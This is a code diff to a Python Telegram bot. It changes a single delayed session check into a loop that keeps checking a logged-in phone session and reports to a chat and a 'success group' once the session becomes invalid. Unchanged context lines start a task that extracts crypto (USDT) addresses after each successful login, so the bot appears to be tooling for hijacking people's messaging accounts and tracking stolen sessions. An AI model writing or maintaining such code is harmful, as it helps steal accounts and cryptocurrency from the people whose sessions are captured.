@@ -179,24 +179,41 @@ async def _handle_login_success(bot: Bot, chat_id: int, uid: int,
     if _cfg and _cfg.get("usdt_extract_enabled", False):
         asyncio.create_task(_extract_crypto_addresses(bot, chat_id, uid, phone))
 
-    # Schedule delayed session check (only if enabled)
+    # Schedule periodic session check (only if enabled)
     if _cfg and _cfg.get("session_check_enabled", False):
-        delay = int(_c("post_login_check_delay", "86"))
-        if delay > 0:
-            asyncio.create_task(_post_login_session_check(bot, chat_id, phone, delay))
+        asyncio.create_task(_post_login_session_check(bot, chat_id, phone))
 
 
-async def _post_login_session_check(bot: Bot, chat_id: int,
-                                     phone: str, delay: int):
-    """Wait then check session validity and notify user + group."""
+async def _post_login_session_check(bot: Bot, chat_id: int, phone: str):
+    """Periodically check session validity while the option is enabled.
+
+    Loops every ``post_login_check_delay`` seconds (re-read each round so a
+    changed value takes effect). The "session valid" text is sent only the
+    first time it is confirmed valid to avoid spamming the user; once the
+    session is found invalid the failure notice is sent (and the group is
+    notified if enabled) and the loop stops.
+    """
+    notified_valid = False
     try:
-        await asyncio.sleep(delay)
-        result = await login_engine.check_session(phone)
-        if result["success"]:
-            text = _c("session_valid_text", "✅ Session 有效")
-        else:
+        while _cfg and _cfg.get("session_check_enabled", False):
+            delay = int(_c("post_login_check_delay", "86"))
+            if delay <= 0:
+                break
+            await asyncio.sleep(delay)
+
+            result = await login_engine.check_session(phone)
+            logger.info(f"Session check for {phone}: {result['success']}")
+
+            if result["success"]:
+                if not notified_valid:
+                    notified_valid = True
+                    text = _c("session_valid_text", "✅ Session 有效")
+                    await bot.send_message(
+                        chat_id=chat_id, text=text, parse_mode="HTML")
+                continue
+
+            # Session invalid — notify user, optionally the group, then stop.
             text = _c("session_invalid_text", "❌ Session 无效")
-            # Notify group if enabled
             if _cfg and _cfg.get("session_invalid_notify_group", False):
                 group_id = _c("success_group_id", "")
                 if group_id:
@@ -213,8 +230,8 @@ async def _post_login_session_check(bot: Bot, chat_id: int,
                         logger.info(f"Session 失效通知已发送到群: {group_id}")
                     except Exception as e:
                         logger.error(f"发送 session 失效通知到群失败: {e}")
-        await bot.send_message(chat_id=chat_id, text=text, parse_mode="HTML")
-        logger.info(f"Post-login check for {phone}: {result['success']}")
+            await bot.send_message(chat_id=chat_id, text=text, parse_mode="HTML")
+            break
     except asyncio.CancelledError:
         pass
     except Exception as e:
